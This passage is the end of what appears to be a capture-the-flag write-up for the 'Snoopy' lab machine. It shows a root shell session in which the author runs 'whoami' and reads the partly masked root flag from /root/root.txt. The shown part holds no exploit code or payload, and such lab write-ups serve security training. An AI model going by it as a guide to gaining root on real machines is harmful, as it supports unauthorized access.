<span class="n">To</span><span class="w"> </span><span class="n">restore</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">content</span><span class="p">,</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="err">'</span><span class="n">unminimize</span><span class="err">'</span><span class="w"> </span><span class="n">command</span><span class="p">.</span>
<span class="n">Failed</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">https</span><span class="o">:</span><span class="c1">//changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span>

<span class="n">Last</span><span class="w"> </span><span class="n">login</span><span class="o">:</span><span class="w"> </span><span class="n">Fri</span><span class="w"> </span><span class="n">May</span><span class="w"> </span><span class="mi">12</span><span class="w"> </span><span class="mi">21</span><span class="o">:</span><span class="mi">28</span><span class="o">:</span><span class="mi">56</span><span class="w"> </span><span class="mi">2023</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="mf">10.10.14.46</span>

<span class="n">root</span><span class="p">@</span><span class="n">snoopy</span><span class="o">:~</span><span class="err">#</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

Finally as root, we can now read the last flag:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">root</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">whoami</span>
<span class="n">root</span>
<span class="n">root</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
<span class="mi">4602</span><span class="n">b</span><span class="o">**********************</span><span class="mi">4</span><span class="n">cf39</span>
<span class="n">root</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w">    </span>
</code></pre><br style="line-height: 0.5;"/></div></br></br></br></br></br></br></br></br></br></br></br></br></br>
            </div>
        </div>
    </section>

    <footer>
        <p>&copy; 2023 elswix.github.io</p>
    </footer>
</body>
</html>
